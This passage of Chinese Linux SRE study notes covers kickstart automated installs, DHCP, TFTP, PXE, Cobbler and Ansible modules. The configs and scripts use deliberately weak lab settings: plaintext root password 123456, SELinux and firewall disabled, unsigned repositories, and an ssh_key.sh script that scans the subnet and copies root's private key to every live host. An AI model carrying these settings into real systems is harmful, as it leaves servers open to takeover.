        https://mirrors.cloud.tencent.com/centos/$releasever/os/$basearch/
gpgcheck=0

[extras]
name=extras
baseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/extras/$basearch
        https://mirrors.huaweicloud.com/centos/$releasever/extras/$basearch
        https://mirrors.cloud.tencent.com/centos/$releasever/extras/$basearch
        https://mirrors.aliyun.com/centos/$releasever/extras/$basearch
gpgcheck=0
enabled=1

[epel]
name=epel
baseurl=http://mirrors.cloud.tencent.com/epel/$releasever/$basearch
        http://mirrors.huaweicloud.com/epel/$releasever/$basearch
gpgcheck=1
gpgkey=http://mirrors.huaweicloud.com/epel/RPM-GPG-KEY-EPEL-7

EOF

%end


#centos8的应答文件
#只能创建centos7的虚拟机才能成功安装
#version=RHEL8
# Use graphical install
text
reboot
selinux --disabled
firewall --disabled
url --url="http://10.0.0.7/centos/8/os/x86_64"
%packages
@^minimal-environment
kexec-tools

%end

# Keyboard layouts
keyboard --xlayouts='us'
# System language
lang en_US.UTF-8

# Network information
bootloader --append="net.ifnames=0 --location=mbr"
network  --bootproto=dhcp --device=eth0 --ipv6=auto --activate
network  --hostname=centos8.liusenbiao.org

# Use CDROM installation media

# Run the Setup Agent on first boot
firstboot --enable

zerombr
clearpart --all --initlabel
ignoredisk --only-use=sda
# Partition clearing information
# Disk partitioning information
part /boot --fstype="xfs" --ondisk=sda --size=1024
part swap --fstype="swap" --ondisk=sda --size=4096
part / --fstype="xfs" --ondisk=sda --size=102400
part /data --fstype="xfs" --ondisk=sda --size=51200
# System timezone
timezone Asia/Shanghai --isUtc --nontp

# Root password
rootpw --plaintext 123456

%addon com_redhat_kdump --enable --reserve-mb='auto'

%end

%anaconda
pwpolicy root --minlen=6 --minquality=1 --notstrict --nochanges --notempty
pwpolicy user --minlen=6 --minquality=1 --notstrict --nochanges --emptyok
pwpolicy luks --minlen=6 --minquality=1 --notstrict --nochanges --notempty
%end

#centos8的应答文件二：
#只能创建centos7的虚拟机才能成功安装
#version=RHEL8
# Use graphical install
ignoredisk --only-use=sda
zerombr
text
reboot
clearpart --all --initlabel
selinux --disabled
firewall --disabled
url --url="http://10.0.0.7/centos/8/os/x86_64"
keyboard --vckeymap=us --xlayouts='us'
lang en_US.UTF-8
network  --bootproto=dhcp --device=eth0 --ipv6=auto --activate
bootloader --append="net.ifnames=0" --location=mbr --boot-drive=sda
rootpw --plaintext 123456
network  --hostname=centos8.liuawnbiao.org
firstboot --enable
skipx
services --disabled="chronyd"
timezone Asia/Shanghai --isUtc --nontp
user --name=liu --
rootpw --plaintext 123456
#autopart --type=lvm
#part / --fstype xfs --size 1 --grow --ondisk sda 可以实现根自动使用所有剩余空
间
part / --fstype="xfs" --ondisk=sda --size=102400
part /data --fstype="xfs" --ondisk=sda --size=51200
part swap --fstype="swap" --ondisk=sda --size=2048
part /boot --fstype="ext4" --ondisk=sda --size=1024
%packages
@^minimal-environment
kexec-tools
%end
%addon com_redhat_kdump --enable --reserve-mb='auto'
%end
%anaconda
pwpolicy root --minlen=6 --minquality=1 --notstrict --nochanges --notempty
pwpolicy user --minlen=6 --minquality=1 --notstrict --nochanges --emptyok
pwpolicy luks --minlen=6 --minquality=1 --notstrict --nochanges --notempty
%end

[22:10:25 root@centos7 html]#mkdir ks
要保证应答文件能够访问
[22:51:44 root@liu ~]#cp ks7.cfg /var/www/html/ks/centos7.cfg
#centos8作为应答文件的存放路径
```

![1652192191364](linuxSRE.assets/1652192191364.png)

```
创建新的虚拟机 要找个Netinstall的镜像，大约600M左右
进入类似于救援模式下面，按ESC键
boot: linux ks=http://10.0.0.8/ks/centos7.cfg
```

![1652192529043](linuxSRE.assets/1652192529043.png)

#### 31.1.2实现DHCP服务

```
先禁用VMware中的DHCP
```

![1652232103860](linuxSRE.assets/1652232103860.png)

```
[09:23:09 root@liu ~]#yum -y install dhcp
[09:23:19 root@liu ~]# rpm -ql dhcp
#这个时候你会发现服务启动不起来
[09:26:58 root@liu ~]# systemctl enable --now dhcpd 
#查看日记看出错情况
[09:26:58 root@liu ~]#cat /var/log/messages
```

![1652232664045](linuxSRE.assets/1652232664045.png)

```
[09:26:58 root@liu ~]#vim /etc/dhcp/dhcpd.conf 
#发现里面都是注释
# see /usr/share/doc/dhcp*/dhcpd.conf.example
#于是把范例的文件拷过来覆盖
[09:44:33 root@liu ~]#cp /usr/share/doc/dhcp*/dhcpd.conf.example /etc/dhcp/dhcpd.conf
[09:48:38 root@liu ~]#vim /etc/dhcp/dhcpd.conf
#把subnet原网段的的范例地址改成你自己定义网段的地址
subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.150 10.0.0.180;
  option routers 10.0.0.2;  #你的路由地址
}
option domain-name-servers 180.76.76.76, 223.5.5.5;

default-lease-time 86400;
max-lease-time 106400;
#如果你想要别的主机每次都获取dhcp上固定的ip
# Fixed IP addresses can also be specified for hosts.   These addresses下面设置
host testhost {
   hardware ethernet 00:0c:29:92:5c:c8;#别的主机mac地址
   fixed-address 10.0.0.123;#每次要求分配的固定ip
}

#重启服务发现成功了
[09:48:00 root@liu ~]# systemctl enable --now dhcpd
#查看谁从我这里获取了dhcp地址
[10:57:17 root@liu dhcpd]#cat /var/lib/dhcpd/dhcpd.leases
```

![1652238541315](linuxSRE.assets/1652238541315.png)

**每次从dhcp中获得固定的ip**

![1652240493302](linuxSRE.assets/1652240493302.png)

#### 31.1.3实现TFTP服务

```
#服务器端centos7
[11:59:24 root@liu ~]#yum -y install tftp-server
[12:22:22 root@liu ~]#vim /etc/dhcp/dhcpd.conf
# dhcpd.conf
# Sample configuration file for ISC dhcpd
#
# option definitions common to all supported networks...
option domain-name "example.org";
option domain-name-servers 180.76.76.76, 223.5.5.5;

default-lease-time 86400;
max-lease-time 106400;

# Use this to enble / disable dynamic dns updates globally.
#ddns-update-style none;

# If this DHCP server is the official DHCP server for the local
# network, the authoritative directive should be uncommented.
#authoritative;

# Use this to send dhcp log messages to a different log file (you also
# have to hack syslog.conf to complete the redirection).
log-facility local7;

# No service will be given on this subnet, but declaring it helps the 
# DHCP server to understand the network topology.

subnet 10.0.0.0 netmask 255.255.255.0 {
    range 10.0.0.150 10.0.0.180;
    option routers 10.0.0.2;
    next-server 10.0.0.7; #TFTP服务器
    filename "pxelinux.0"; #类似于实现grub的功能
}

#客户端我用的ubuntu
[12:03:23 liu@ubuntu1804 ~]$sudo apt install tftp
[12:06:17 liu@ubuntu1804 ~]$tftp 10.0.0.7 #连接需要下载的文件的服务器
```

#### 31.1.4PXE自动化系统部署

**pxe启动工作原理**

![1652259822135](linuxSRE.assets/1652259822135.png)

```
关闭防火墙和SELINUX，DHCP服务器静态IP
网络要求：关闭Vmware软件中的DHCP服务
[11:59:24 root@liu ~]#yum -y install httpd tftp-server dhcp syslinux system-config-kickstart
[19:17:07 root@liu ~]#cd /var/lib/tftpboot/
[19:19:09 root@liu tftpboot]#cp /usr/share/syslinux/pxelinux.0 /usr/share/syslinux/menu.c32 .
#接下来要在VMare上添加一个CD光盘，用的是centos8的iso文件
#然后进行挂载，目的就是为了客户端文件可以直接连上去下载各类包
[20:44:43 root@liu ~]#mount /dev/sr0 /var/www/html/centos/7/os/x86_64/
[20:44:43 root@liu ~]#mount /dev/sr1 /var/www/html/centos/8/os/x86_64/
[23:55:32 root@liu tftpboot]#mkdir centos{7,8}
[20:41:35 root@liu tftpboot]#cp /var/www/html/centos/8/os/x86_64/isolinux/{vmlinuz,initrd.img} centos8/  #配置内核和虚拟文件系统
[20:41:39 root@liu tftpboot]#cp /var/www/html/centos/7/os/x86_64/isolinux/{vmlinuz,initrd.img} centos7/ #配置内核和虚拟文件系统
[20:42:01 root@liu tftpboot]#tree
.
├── centos7
│   ├── initrd.img
│   └── vmlinuz
├── centos8
│   ├── initrd.img
│   └── vmlinuz
├── menu.c32
└── pxelinux.0
[20:42:06 root@liu tftpboot]#cp /var/www/html/centos/8/os/x86_64/isolinux/{ldlinux.c32,libcom32.c32,libutil.c32} . #centos8才有的文件
[21:07:05 root@liu tftpboot]#ls
centos7  centos8  ldlinux.c32  libcom32.c32  libutil.c32  menu.c32  pxelinux.0

#还差一个菜单
[21:08:56 root@liu tftpboot]#mkdir pxelinux.cfg
[21:11:27 root@liu tftpboot]#cp /var/www/html/centos/7/os/x86_64/isolinux/isolinux.cfg pxelinux.cfg/default
[21:27:08 root@liu tftpboot]#vim pxelinux.cfg/default
default menu.c32
timeout 600 
menu title Install CentOS Linux
 
label linux8
 menu label Auto Install CentOS Linux ^8
 kernel centos8/vmlinuz
 append initrd=centos8/initrd.img ks=http://10.0.0.7/ks/centos8.cfg
  
label linux7
 menu label Auto Install CentOS Linux ^7  
 kernel centos7/vmlinuz
 append initrd=centos7/initrd.img ks=http://10.0.0.7/ks/centos7.cfg
  
label manual
 menu label ^Manual Install CentOS Linux 8.0 
 kernel centos8/vmlinuz
 append initrd=centos8/initrd.img ks=http://10.0.0.7/centos/8/os/x86_64/

label rescue
 menu label ^Rescue a CentOS Linux system 8
 kernel centos8/vmlinuz
 append initrd=centos8/initrd.img ks=http://10.0.0.7/centos/8/os/x86_64/  rescue
 
label local
 menu default
 menu label Boot from ^local drive
 localboot 0xffff
:%s/100/7/g :表示全局替换，把100换成7

[21:37:01 root@liu tftpboot]#tree
├── centos7
│   ├── initrd.img
│   └── vmlinuz
├── centos8
│   ├── initrd.img
│   └── vmlinuz
├── ldlinux.c32
├── libcom32.c32
├── libutil.c32
├── menu.c32
├── pxelinux.0
└── pxelinux.cfg
    └── default
    
[21:42:32 root@liu ~]# systemctl restart dhcpd httpd tftp
#自动化安装的时候会出现如下错误
#valueerror new value non-existent xfs filesystem is not valid as a default fs type
解决方法：
这个是由于使用的initrd.img 和vmlinuz版本与将要安装的iso镜像不匹配导致的。
我的原因就是mount挂载的时候挂载错了，重新挂载下就行了
```

![1652280942540](linuxSRE.assets/1652280942540.png)

![1652280026401](linuxSRE.assets/1652280026401.png)

![1652280169758](linuxSRE.assets/1652280169758.png)

**按b进行自动化安装**

![1652281821556](linuxSRE.assets/1652281821556.png)

**接下来都是自动化安装**

![1652282979532](linuxSRE.assets/1652282979532.png)

#### 31.1.5Cobbler自动化安装

**Cobbler的工作原理**

![1652284810508](linuxSRE.assets/1652284810508.png)

```
实战案例：CentOS 7 基于cobbler实现系统的自动化安装
[14:26:06 root@liu ~]#yum install cobbler dhcp -y
[14:27:55 root@liu ~]#systemctl enable --now cobblerd httpd tftp dhcpd
[14:58:50 root@liu ~]#cobbler check
#其中会出现httpd does not appear to be running and proxying cobbler, or SELinux is in the way. Original traceback错误
#解决办法：[14:59:06 root@liu ~]#systemctl restart httpd

[14:58:50 root@liu ~]#cobbler check
The following are potential configuration items that you may want to fix:

1 : The 'server' field in /etc/cobbler/settings must be set to something other than localhost, or kickstarting features will not work.  This should be a resolvable hostname or IP for the boot server as reachable by all machines that will use it.
2 : For PXE to be functional, the 'next_server' field in /etc/cobbler/settings must be set to something other than 127.0.0.1, and should match the IP of the boot server on the PXE network.
3 : change 'disable' to 'no' in /etc/xinetd.d/tftp
4 : Some network boot-loaders are missing from /var/lib/cobbler/loaders.  If you only want to handle x86/x86_64 netbooting, you may ensure that you have installed a *recent* version of the syslinux package installed and can ignore this message entirely.  Files in this directory, should you want to support all architectures, should include pxelinux.0, menu.c32, elilo.efi, and yaboot.
5 : enable and start rsyncd.service with systemctl
6 : debmirror package is not installed, it will be required to manage debian deployments and repositories
7 : ksvalidator was not found, install pykickstart
8 : The default password used by the sample templates for newly installed machines (default_password_crypted in /etc/cobbler/settings) is still set to 'cobbler' and should be changed, try: "openssl passwd -1 -salt 'random-phrase-here' 'your-password-here'" to generate new one
9 : fencing tools were not found, and are required to use the (optional) power management features. install cman or fence-agents to use them

Restart cobblerd and then run 'cobbler sync' to apply changes

[15:02:45 root@liu ~]#vim /etc/cobbler/settings
按住esc键/127.0.0.1 
在390行改成server: 10.0.0.7
在278行改成 next_server: 10.0.0.7 #tftp服务器地址
在242行改成manage_dhcp: 1
[15:19:44 root@liu ~]#openssl passwd -1 123456
$1$.O78iwPr$HoxHAgeMo7BSWXXz2IWEq/
在101行改成自己生产的密码default_password_crypted: "$1$.O78iwPr$HoxHAgeMo7BSWXXz2IWEq/"
[15:23:33 root@liu ~]#systemctl restart cobblerd.service
[16:35:14 root@liu ~]#cobbler get-loaders
[16:55:27 root@liu ~]#cobbler sync
[16:57:44 root@liu ~]#tree /var/lib/tftpboot/
/var/lib/tftpboot/
├── boot
│   └── grub
│       └── menu.lst
├── etc
├── grub
│   ├── efidefault
│   ├── grub-x86_64.efi
│   ├── grub-x86.efi
│   └── images -> ../images
├── images
├── images2
├── memdisk
├── menu.c32
├── ppc
├── pxelinux.0
├── pxelinux.cfg
│   └── default
└── s390x
│  └── profile_list
├── yaboot
10 directories,10 files
[16:58:46 root@liu ~]#vim /etc/cobbler/dhcp.template
#修改以下内容
subnet 10.0.0.0 netmask 255.255.255.0 {
       option routers             10.0.0.2;
       option domain-name-servers 180.76.76.76;
       option subnet-mask         255.255.255.0;
       range dynamic-bootp        10.0.0.120 10.0.0.254;
[17:08:16 root@liu ~]#cobbler sync #自动生成dhcp配置文件
[17:11:08 root@liu ~]#vim /etc/dhcp/dhcpd.conf #看一下生成的dhcp文件
[17:12:43 root@liu ~]#vim /etc/cobbler/pxe/pxedefault.template #这个是用来改菜单上的公司名
MENU TITLE Cobbler | http://www.liusenbiao.com

#导入CentOS系统的安装文件，生成相应的YUM源
[17:22:42 root@liu ~]#cobbler import --name=centos-7.9-x86_64 --path=/misc/cd --arch=x86_64 #导入centos7.9版本
在VMware里面添加centos8.2的CD光盘
[17:31:15 root@liu ~]#mount /dev/sr1 /mnt/
[17:31:39 root@liu ~]#cobbler import --name=centos-8.2-x86_64 --path=/mnt --arch=x86_64 #导入centos8.2版本
[18:05:27 root@liu ~]#du -sh /var/www/cobbler/ks_mirror/*
9.6G	/var/www/cobbler/ks_mirror/centos-7.9-x86_64
9.6G	/var/www/cobbler/ks_mirror/centos-8.1-x86_64
9.6G	/var/www/cobbler/ks_mirror/centos-8.3-x86_64
```

![1652348988653](linuxSRE.assets/1652348988653.png)

```
 支持UEFI安装
 新建虚拟机,一路下一步，只需要改一个磁盘容量大小
[17:35:20 root@liu ~]#vim /etc/cobbler/pxe/efidefault.template
 timeout=100 只要改这个就行
[18:27:34 root@liu ~]#cobbler sync
#验证生效
[19:00:51 root@liu ~]#head -n 2 /var/lib/tftpboot/grub/efidefault
default=0
timeout=100
[19:29:13 root@liu ~]#vim centos7.cfg
把第29行的url --url=$tree改成这个
[19:29:13 root@liu ~]#vim centos8.cfg
把url --url=$tree改成这个
[19:35:12 root@liu ~]#systemctl restart cobblerd
[19:36:25 root@liu ~]#cobbler sync
[19:36:39 root@liu ~]#cobbler distro list
   centos-7.9-x86_64
   centos-8.1-x86_64
   centos-8.3-x86_64
```

![1652350494521](linuxSRE.assets/1652350494521.png)

![1652350603229](linuxSRE.assets/1652350603229.png)

![1652350670893](linuxSRE.assets/1652350670893.png)

![1652355662912](linuxSRE.assets/1652355662912.png)

```
准备 kickstart文件,并关联至指定的YUM源
[19:37:39 root@liu ~]#cp centos7.cfg  /var/lib/cobbler/kickstarts/
[19:42:06 root@liu ~]#ll /var/lib/cobbler/kickstarts/
#将kickstart文件，关联指定的YUM源和生成菜单列表
[19:45:41 root@liu ~]#cobbler profile add --name=CentOS-7.9_mini --distro=CentOS-7.9-x86_64 --kickstart=/var/lib/cobbler/kickstarts/centos7.cfg
[19:43:40 root@liu ~]#cobbler profile add --name=CentOS-8.3_mini --distro=CentOS-8.3-x86_64 --kickstart=/var/lib/cobbler/kickstarts/centos8.cfg
#删除到你指定想要安装的菜单
[19:47:38 root@liu ~]#cobbler profile remove --name=centos-8.1-x86_64
[19:48:48 root@liu ~]#cobbler profile remove --name=centos-8.3-x86_64
[19:48:59 root@liu ~]#cobbler profile remove --name=centos-7.9-x86_64
```

![1652356258182](linuxSRE.assets/1652356258182.png)

```
实现cobbler 的web管理
[19:49:17 root@liu ~]#yum -y install cobbler-web
[19:56:48 root@liu ~]#systemctl restart httpd
浏览器登录https://10.0.0.7/cobbler_web/ksfile/list
账户密码都是默认的cobbler
#设置新的用户名密码
[20:00:18 root@liu ~]#htdigest -c /etc/cobbler/users.digest 
```

![1652357271921](linuxSRE.assets/1652357271921.png)

### 31.2ANSIBLE部署

#### 31.2.1inventory配置说明

![1653990796001](linuxSRE.assets/1653990796001.png)

#### 31.2.2Ansible测试连接

```
#1.安装ansible
[23:51:35 root@ansible ~]# yum install ansible -y


#2.修改配置文件
[23:51:35 root@ansible ~]# vim /etc/ansible/hosts
#最后一行添加上需要管理的机器
[local]
10.0.0.57 ansible_connection=local #管理自己的本机

[websrvs]
10.0.0.7
10.0.0.18

[dbsrvs]
10.0.0.17
10.0.0.18

[appsrvs]
10.0.0.7
10.0.0.8
10.0.0.48


#3.实现多台主机基于key验证脚本
[23:51:35 root@ansible ~]# vim ssh_key.sh
#!/bin/bash
#
#*********************************************
#Author:            liusenbiao
#Description：      基于key验证多主机ssh访问
#Date:              2021-03-31
#*********************************************

PASS=123456
#设置网段最后的地址，4-255之间，越小扫描越快
END=254

IP=`ip a s eth0 | awk -F'[ /]+' 'NR==3{print $3}'`
NET=${IP%.*}.

rm -f /root/.ssh/id_rsa
[ -e ./SCANIP.log ] && rm -f SCANIP.log
for((i=3;i<="$END";i++));do
ping -c 1 -w 1  ${NET}$i &> /dev/null  && echo "${NET}$i" >> SCANIP.log &
done
wait

ssh-keygen -P "" -f /root/.ssh/id_rsa
rpm -q sshpass || yum -y install sshpass
sshpass -p $PASS ssh-copy-id -o StrictHostKeyChecking=no $IP 

AliveIP=(`cat SCANIP.log`)
for n in ${AliveIP[*]};do
sshpass -p $PASS scp -o StrictHostKeyChecking=no -r /root/.ssh root@${n}:
done

#把.ssh/known_hosts拷贝到所有主机，使它们第一次互相访问时不需要输入回车
for n in ${AliveIP[*]};do
scp /root/.ssh/known_hosts ${n}:.ssh/
done
[23:51:35 root@ansible ~]#bash ssh_key.sh
##已经实现key验证的主机
[23:23:05 root@centos7 ~]#cat SCANIP.log
10.0.0.18
10.0.0.57
10.0.0.8
10.0.0.48
10.0.0.17



#4.管理所有的远程主机
[23:54:45 root@ansible ~]#ansible all --list-hosts
#查看一共需要被管理的机器
hosts (5):
10.0.0.18
10.0.0.8
10.0.0.48
10.0.0.17
10.0.0.57
[23:54:46 root@ansible ~]#ansible all -m ping
-m:表示模块
这条命令表示测试能否控制远程主机
#出现以下表示成功
10.0.0.48 | SUCCESS => {
    "ansible_facts": {
        "discovered_interpreter_python": "/usr/libexec/platform-python"
    }, 
    "changed": false, 
    "ping": "pong"
}
```

#### 31.2.3Ansible相关工具

```
#1.ansible相关功能
/usr/bin/ansible 主程序，临时命令执行工具
/usr/bin/ansible-doc 查看配置文档，模块功能查看工具,相当于man 
/usr/bin/ansible-playbook 定制自动化任务，编排剧本工具,相当于脚本
/usr/bin/ansible-pull 远程执行命令的工具
/usr/bin/ansible-vault 文件加密工具
/usr/bin/ansible-console 基于Console界面与用户交互的执行工具
/usr/bin/ansible-galaxy 下载/上传优秀代码或Roles模块的官网平台



#2.ansible选项说明
--version #显示版本
-m module   #指定模块，默认为command
-v #详细过程 –vv -vvv更详细
--list-hosts #显示主机列表，可简写 --list
-C, --check   #检查，并不执行
-T, --timeout=TIMEOUT #执行命令的超时时间，默认10s
-k, --ask-pass     #提示输入ssh连接密码，默认Key验证 
-u, --user=REMOTE_USER #执行远程执行的用户
-b, --become    #代替旧版的sudo 切换
--become-user=USERNAME  #指定sudo的runas用户，默认为root
-K, --ask-become-pass  #提示输入sudo时的口令



#3.ansible命令执行过程
1. 加载自己的配置文件,默认/etc/ansible/ansible.cfg
2. 加载自己对应的模块文件，如：command
3. 通过ansible将模块或命令生成对应的临时py文件，并将该文件传输至远程服务器的对应执行用户
$HOME/.ansible/tmp/ansible-tmp-数字/XXX.PY文件
4. 给文件+x执行
5. 执行并返回结果
6. 删除临时py文件，退出
```

#### 31.2.4Ansible常用模块

```
#0.官方文档
https://docs.ansible.com/ansible/2.9/modules/modules_by_category.html



#1.Command 模块
功能：在远程主机执行命令，此为默认模块，可忽略-m选项
不支持幂等性

[10:19:55 root@ansible ~]#ansible websrvs -m command -a 'hostname'
#command后面跟命令
10.0.0.17 | CHANGED | rc=0 >>
pxc2
10.0.0.18 | CHANGED | rc=0 >>
slave1.liusenbiao.org
[10:21:15 root@ansible ~]#ansible websrvs -a 'ls -l /data/ansible.log'
10.0.0.17 | CHANGED | rc=0 >>
-rw-r--r-- 1 root root 0 Jun  1 10:21 /data/ansible.log
10.0.0.18 | CHANGED | rc=0 >>
-rw-r--r-- 1 root root 0 Jun  1 10:21 /data/ansible.log

#creates创建文件夹，如果存在则执行后续命令
[10:33:01 root@ansible ~]#ansible websrvs -m command -a 'creates=/data/mysql mkdir /data/mysql'
[WARNING]: Consider using the file module with state=directory rather than
running 'mkdir'.  If you need to use command because file is insufficient you
can add 'warn: false' to this command task or set 'command_warnings=False' in
ansible.cfg to get rid of this message.
10.0.0.17 | CHANGED | rc=0 >>

10.0.0.18 | SUCCESS | rc=0 >>
skipped, since /data/mysql exists



#2.Shell模块
功能：和command相似，用shell执行命令,支持各种符号,比如:*,$, >
不支持幂等性
注意：调用bash执行命令 类似 cat /tmp/test.md | awk -F'|' '{print $1,$2}' &> /tmp/example.txt 这
些复杂命令，即使使用shell也可能会失败
#2.1把shell模块改成默认模块
[10:33:19 root@ansible ~]#vim /etc/ansible/ansible.cfg
第114行
# default module name for /usr/bin/ansible
module_name = shell
[10:57:36 root@ansible ~]#ansible websrvs -a 'echo $HOSTNAME'
10.0.0.17 | CHANGED | rc=0 >>
pxc2
10.0.0.18 | CHANGED | rc=0 >>
slave1.liusenbiao.org



#3.Script模块
功能：在远程主机上运行ansible服务器上的脚本(无需执行权限)

[11:08:34 root@ansible ~]#ansible websrvs -m script -a '/root/test.sh'



#4.Copy模块
功能：从ansible服务器主控端复制文件到远程主机

#把本地文件的属性所有组上传到远程机器中
[14:38:35 root@ansible ~]#ansible  websrvs -m copy -a 'src=ssh_key.sh dest=/data/ssh.key owner=liu group=bin mode=700'	

#拷贝文件夹,加/表示复制/etc目录自身,注意/etc/后面没有/
#不加/表示文件夹里面的内容
#注意速度非常慢，只适用于拷贝小的配置文件
[14:41:32 root@ansible ~]#ansible websrvs -m copy -a "src=/etc dest=/backup"



#5.Get_url模块
功能：将文件从http,https,或者ftp下载到被管理机节点上

url:下我文件的URL，支持HTTP，HTTPS或FTP协议
dest:下载到目标路径(绝对路径)，如果目标是一个目录，就用服务器上面文件的名称，如果目标设置了名称就用目标设置的名称 owner:指定属主
group:指定属组
mode:指定权限
force:如果yes，dest不是目录，将每次下载文件，如果内容改变，替换文件。如果否，则只有在目标不存在时才会下载该文件 checksum: 对目标文件在下载后计算摘要，以确保其完整性
示例:checksum="sha256:D98291AC[...]B6DC7B97"
checksum="sha256:http://example.com/path/sha256sum.txt"
ur1_username:用于HTTP基本认证的用户名。对于允许空密码的站点，此参数可以不使用`ur1_password
ur1_password:用于HTTP基本认证的密码。如果未指定urusername参数，则不会使用ur1password参数
validate_certs:如果“no”，SSL证书将不会被验证。 适用于自签名证书在私有网站上使用
timeout:URL请求的超时时间，秒为单位

[14:59:23 root@ansible ~]#wget https://nginx.org/download/nginx-1.18.0.tar.gz
[14:59:23 root@ansible ~]#md5sum nginx-1.18.0.tar.gz 
b2d33d24d89b8b1f87ff5d251aa27eb8  nginx-1.18.0.tar.gz
[14:59:51 root@ansible ~]#ansible  websrvs -m get_url -a 'url=https://nginx.org/download/nginx-1.18.0.tar.gz dest=/usr/local/src/nginx.tar.gz checksum=md5:b2d33d24d89b8b1f87ff5d251aa27eb8'




#6.Fetch模块
功能：从远程主机提取文件至ansible的主控端，copy相反，目前不支持目录(日志居多)

#把远程主机的/var/log/messages拷贝到ansible控制端
[15:07:40 root@ansible ~]#ansible  websrvs -m fetch -a 'src=/var/log/messages dest=/data/log




#7.File模块
功能：设置文件属性,创建软链接等
#创建空文件
[15:18:14 root@ansible ~]# ansible all -m file -a 'path=/data/a.txt state=touch owner=root'
#删除文件
[15:18:14 root@ansible ~]# ansible all -m file -a 'path=/data/a.txt state=absent owner=root'
#创建目录
[15:18:14 root@ansible ~]# ansible all -m file -a "path=/data/mysql state=directory owner=mysql 
group=mysql"
#创建软链接
[15:18:14 root@ansible ~]# ansible all -m file -a 'src=/data/testfile path|dest|name=/data/testfile-link 
state=link'
#递归修改目录属性
[15:18:14 root@ansible ~]# ansible all -m file -a "path=/data/mysql state=directory owner=mysql group=mysql recurse=yes"




#8.unarchive 模块
功能：解包解压缩
实现有两种用法：
1、将ansible主机上的压缩包传到远程主机后解压缩至特定目录，设置copy=yes,此为默认值，可省略
2、将远程主机上的某个压缩包解压缩到指定路径下，设置copy=no


常见参数：
copy：默认为yes，当copy=yes，拷贝的文件是从ansible主机复制到远程主机上，如果设置为
copy=no，会在远程主机上寻找src源文件
remote_src：和copy功能一样且互斥，yes表示在远程主机，不在ansible主机，no表示文件在ansible
主机上
src：源路径，可以是ansible主机上的路径，也可以是远程主机(被管理端或者第三方主机)上的路径，如果
是远程主机上的路径，则需要设置copy=no
dest：远程主机上的目标路径
mode：设置解压缩后的文件权限


#把压缩文件解压到远程主机上
[15:45:19 root@ansible ~]#ansible all -m unarchive -a 'src=nginx-1.18.0.tar.gz dest=/usr/local/src owner=root group=bin'
#把互联网上的压缩包下载并解压到别的远程主机上
#copy=no表示ansible主机上没有这个压缩包
[15:49:48 root@ansible ~]#ansible all -m unarchive -a 'src=https://nginx.org/download/nginx-1.20.2.tar.gz dest=/data copy=no'
#把远程主机上的压缩包解压到本地主机上
[15:53:34 root@ansible ~]# ansible all -m unarchive -a 'src=/usr/local/src/nginx.tar.gz dest=/opt copy=no'



#9.Archive模块
功能：打包压缩保存在被管理节点
[15:53:34 root@ansible ~]# ansible websrvs -m archive  -a 'path=/var/log/ dest=/data/log.tar.bz2 format=bz2 
owner=wang mode=0600'



#10.Cron模块
功能：计划任务
支持时间：minute，hour，day，month，weekday


#备份数据库脚本
[root@centos8 ~]#cat /root/mysql_backup.sh 
#!/bin/bash
mysqldump -A -F --single-transaction --master-data=2 -q -uroot |gzip > 
/data/mysql_`date +%F_%T`.sql.gz
#创建任务
ansible 10.0.0.8 -m cron -a 'hour=2 minute=30 weekday=1-5 name="backup mysql" 
job=/root/mysql_backup.sh'
ansible websrvs   -m cron -a "minute=*/5 job='/usr/sbin/ntpdate ntp.aliyun.com 
&>/dev/null' name=Synctime"
#禁用计划任务
ansible websrvs   -m cron -a "minute=*/5 job='/usr/sbin/ntpdate 172.20.0.1 
&>/dev/null' name=Synctime disabled=yes"
#启用计划任务
ansible websrvs   -m cron -a "minute=*/5 job='/usr/sbin/ntpdate 172.20.0.1 
&>/dev/null' name=Synctime disabled=no"
#删除任务
ansible websrvs -m cron -a "name='backup mysql' state=absent"
ansible websrvs -m cron -a 'state=absent name=Synctime



#11.Yum和Apt模块
功能：
yum 管理软件包，只支持RHEL，CentOS，fedora，不支持Ubuntu其它版本
apt 模块管理 Debian 相关版本的软件包

[18:12:43 root@ansible ~]# ansible websrvs -m yum -a 'name=httpd state=present'  #安装
[18:12:43 root@ansible ~]# ansible websrvs -m yum -a 'name=httpd state=absent'   #删除
[18:12:43 root@ansible ~]# ansible 10.0.0.17 -m yum -a 'list=httpd'  #查看状态




#12.Service模块
功能：管理服务
[18:12:43 root@ansible ~]# ansible all -m service -a 'name=httpd state=started enabled=yes' #设置为开机启动
[18:12:43 root@ansible ~]# ansible all -m service -a 'name=httpd state=stopped'
[18:12:43 root@ansible ~]# ansible all -m service -a 'name=httpd state=reloaded'
[18:12:43 root@ansible ~]# ansible all -m shell -a "sed -i 's/^Listen 80/Listen 8080/' 
/etc/httpd/conf/httpd.conf"
[18:12:43 root@ansible ~]# ansible all -m service -a 'name=httpd state=restarted'



#13.User模块
功能：管理用户

#创建用户
[18:12:43 root@ansible ~]# ansible all -m user -a 'name=user1 comment="test user" uid=2048 home=/app/user1 
group=root'
[18:12:43 root@ansible ~]# ansible all -m user -a 'name=nginx comment=nginx uid=88 group=nginx 
groups="root,daemon" shell=/sbin/nologin system=yes create_home=no 
home=/data/nginx non_unique=yes'
#remove=yes表示删除用户及家目录等数据,默认remove=no
[18:12:43 root@ansible ~]# ansible all -m user -a 'name=nginx state=absent remove=yes'



#14.Group模块
功能：管理组
#创建组
[18:12:43 root@ansible ~]# ansible websrvs -m group  -a 'name=nginx gid=88 system=yes'
#删除组
[18:12:43 root@ansible ~]# ansible websrvs -m group  -a 'name=nginx state=absent



#15.Lineinfile模块
ansible在使用sed进行替换时，经常会遇到需要转义的问题，而且ansible在遇到特殊符号进行替换时，存在问题，无法正常进行替换 。其实在ansible自身提供了两个模块：lineinfile模块和replace模块，可以方便的进行替换
一般在ansible当中去修改某个文件的单行进行替换的时候需要使用lineinfile模块
regexp参数 ：使用正则表达式匹配对应的行，当替换文本时，如果有多行文本都能被匹配，则只有最后面被匹配到的那行文本才会被替换，当删除文本时，如果有多行文本都能被匹配，这么这些行都会被
删除。
如果想进行多行匹配进行替换需要使用replace模块
功能：相当于sed，可以修改文件内容


[18:12:43 root@ansible ~]# ansible websrvs -m lineinfile -a "path=/etc/httpd/conf/httpd.conf 
regexp='^Listen' line='Listen 80'"
[18:12:43 root@ansible ~]# ansible all -m   lineinfile -a "path=/etc/selinux/config regexp='^SELINUX=' 
line='SELINUX=disabled'"
[18:12:43 root@ansible ~]# ansible all -m lineinfile  -a 'dest=/etc/fstab state=absent regexp="^#"' #删除#号开头的行




